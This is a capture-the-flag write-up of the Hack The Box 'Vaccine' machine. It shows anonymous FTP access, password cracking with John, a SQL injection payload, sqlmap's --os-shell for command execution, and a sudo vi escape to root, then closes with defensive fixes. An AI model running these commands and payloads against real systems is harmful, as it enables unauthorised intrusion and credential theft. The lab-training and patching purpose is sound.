---
title: "HTB: Vaccine - Injecting SQL to Root"
description: "Pwned Vaccine on Hack The Box. From anonymous FTP to SQLmap OS-Shell to a neat little vi sudo escape."
date: 2026-07-23T14:50:24+01:00
tags: ["htb", "linux", "sql-injection", "sudo", "red-team", "cracking"]
authors: ["0xakr4m"]
image: ../images/headers/vagabond-06.png
draft: false
---

> *"The essence of the way is to cut down your opponent."* — Miyamoto Musashi, *Vagabond*

## 1. Quick Info Card

- **Machine Name:** Vaccine
- **OS / Type:** Linux
- **Difficulty:** Very Easy
- **Key Vulnerability:** Anonymous FTP → Weak ZIP Password → Hardcoded Credentials → SQL Injection → Sudo Misconfiguration → Root via vi

## 2. The Game Plan & The Rabbit Holes (Red Teamer Mindset)

Alright, let's set the scene. We fire up the HTB VPN, add the target IP to our `/etc/hosts` because we're not savages, and run Nmap.

**The Plan (in our heads):**
> "Okay, Nmap's running. Probably some web server, maybe SSH, let's see what we're working with. Easy claps."

**What we actually got:**
```text
21/tcp  open  ftp     vsftpd 3.0.3  (Anonymous FTP login allowed)
22/tcp  open  ssh     OpenSSH 8.0p1
80/tcp  open  http    Apache httpd 2.4.41
```

**The Immediate Thoughts:**
- **Port 21 → FTP with anonymous login?** That's like leaving your front door wide open with a sign that says "Free stuff inside." Bet.
- **Port 22 → SSH.** Cool, but we don't have creds yet.
- **Port 80 → Web server.** Let's poke it.

**Facepalm Moment #1:** We browse to `http://10.129.116.62` and it's a basic login page. No hidden directories in gobuster besides `/images/` and `/server-status`. No `robots.txt`. No `phpinfo.php`. We're sitting there like:
> "Is this it? Did I break the VPN? Is my Kali cursed?"

**The Aha Moment:** We check FTP and find `backup.zip`. Download it. It's password protected. Great. Another rabbit hole.

**Facepalm Moment #2:** We crack the ZIP password in under a second. It's `741852963`. Of course it is. Classic smooth-brain sysadmin move.

**Facepalm Moment #3:** We find an MD5 hash in `index.php` and crack it with John in 0.5 seconds. Password: `qwerty789`. At this point, we're genuinely questioning the security of this entire box.

**The Aha Moment #2:** We log in, find a search bar, and it's vulnerable to SQL injection. We use `sqlmap` to get a shell. Easy money. Then we find a database password in `dashboard.php` and use it for sudo. Root in minutes.

**The Thought:** "Wait, is it really that easy? No way."

Yes way. It was that easy. The entire box is just a chain of terrible decisions by the admin. Let's break it down.

---

## 3. The Execution (Step-by-Step Walkthrough)

### Recon

**Nmap Scan:**
```bash
nmap -T4 -n -Pn --top-ports 1000 -sC -sV 10.129.116.62
```

**Results:**
```text
21/tcp  open  ftp     vsftpd 3.0.3  (Anonymous FTP login allowed)
22/tcp  open  ssh     OpenSSH 8.0p1
80/tcp  open  http    Apache httpd 2.4.41
```

**What we learned:**
- Linux box (Ubuntu)
- vsftpd 3.0.3 with anonymous login
- OpenSSH 8.0p1
- Apache 2.4.41

### FTP Enumeration

Anonymous FTP is enabled. We log in and download `backup.zip`:

```bash
curl -u anonymous: -o backup.zip ftp://10.129.116.62/backup.zip
```

### Cracking the ZIP Password

We use `zip2john` and John the Ripper to literally obliterate the password:

```bash
zip2john backup.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

**Result:** Password `741852963`.

### Unzipping and Finding Credentials

Unzip the archive:

```bash
unzip -P 741852963 backup.zip
```

**Contents:**
- `index.php`
- `style.css`

In `index.php`, we find a hardcoded MD5 hash:

```php
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")
```

### Cracking the MD5 Hash

We save the hash and crack it with John:

```bash
echo "2cb42f8734ea607eefed3b70af13bbd3" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Result:** `qwerty789`.

### Web Login and SQL Injection Discovery

We log in as `admin` with password `qwerty789`. The dashboard has a search bar that is vulnerable to SQL injection. We can confirm this manually or just let `sqlmap` go brrr.

**Manual test:**
```text
http://10.129.116.62/dashboard.php?search=1' OR '1'='1' --
```

### Using sqlmap for Exploitation

We use `sqlmap` to detect the vulnerability and pop a shell:

```bash
sqlmap -u "http://10.129.116.62/dashboard.php?search=1" --cookie="PHPSESSID=gm4c3q2ghsnf41mdct3gkb4ea9" --batch -p search
```

**Findings:** PostgreSQL with stacked queries and error-based injection.

### Command Execution with `--os-shell`

We use `sqlmap`'s `--os-shell` feature to get system command execution directly through the DB:

```bash
sqlmap -u "http://10.129.116.62/dashboard.php?search=1" --cookie="PHPSESSID=gm4c3q2ghsnf41mdct3gkb4ea9" --os-shell
```

**Result:** We get an `os-shell>` prompt as the `postgres` user.

### Finding Database Credentials

In the `os-shell`, we read `dashboard.php` and find the database connection string:

```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

**Credentials found:**
- `user: postgres`
- `password: P@s5w0rd!`

### Checking Sudo Privileges

We upgrade to a more stable shell and check sudo.

```bash
echo "P@s5w0rd!" | sudo -S -l
```

**Output:**
```text
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

### Privilege Escalation via vi

We use `vi` to read the root flag. Since we can run it as root, we can just execute commands from inside it.

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Inside vi, we run:

```text
:e /root/root.txt
:w !cat
:q!
```

**Root Flag:** `dd6e058e814260bc70e9bbdef2715849`

### User Flag

We read the user flag from the `postgres` home directory:

```bash
cat /var/lib/postgresql/user.txt
```

**User Flag:** `ec9b13ca4d6229cd5cc1e09980965bf7`

---

## 4. How to Patch This (The Blue Team Defense)

So you're a sysadmin and you just watched a hacker walk into your Linux server with a password from a wordlist that was generated in 2009. *Bruh.* Here's how to stop this from happening.

1. **Secure FTP**
   - *Root Cause:* Anonymous FTP allowed downloading `backup.zip`.
   - *Fix:* Disable anonymous login. If you need to share files, use a secure method like SFTP with proper authentication.

2. **Strong ZIP Passwords**
   - *Root Cause:* ZIP password `741852963` was cracked in under a second.
   - *Fix:* Use strong, randomly generated passwords (12+ characters, mixed case, numbers, symbols). Don't use dictionary words.

3. **Remove Hardcoded Credentials**
   - *Root Cause:* Credentials (`admin` username, MD5 hash, database password) were hardcoded in `index.php` and `dashboard.php`.
   - *Fix:* Store credentials in environment variables or a secure configuration file outside the web root. Never hardcode them in source code.

4. **Use Strong Hashing Algorithms**
   - *Root Cause:* MD5 was used for password hashing. It's weak and easy to crack.
   - *Fix:* Use modern hashing algorithms like `bcrypt`, `Argon2`, or `PBKDF2` with a salt.

5. **Prevent SQL Injection**
   - *Root Cause:* The `search` parameter was directly concatenated into a SQL query.
   - *Fix:* Use prepared statements or parameterized queries. Never trust user input.

6. **Secure Sudo Configuration**
   - *Root Cause:* The `postgres` user was allowed to run `vi` as root.
   - *Fix:* Limit sudo to only the exact commands needed. Avoid allowing powerful editors like `vi` or `vim` with root privileges.

7. **Enable Logging and Monitoring**
   - *Root Cause:* The attack went unnoticed until the box was pwned.
   - *Fix:* Enable and monitor logs for suspicious activity (e.g., failed sudo attempts, FTP access, SQL injection attempts).

---

## Final Thoughts

This machine is a textbook example of how **chaining low-hanging fruit** leads to a full compromise. Anonymous FTP → weak ZIP password → hardcoded MD5 → weak password → SQL injection → database password reuse → sudo misconfiguration. It's a reminder that security is a chain, and the chain is only as strong as its weakest link.

And as Musashi said:
> *"In all things, have no preferences."*

Except maybe prefer better password policies. That's a preference we can all get behind.

GG. See you on the next box.

*Write-up by 0xAkram | HTB Player #76025*
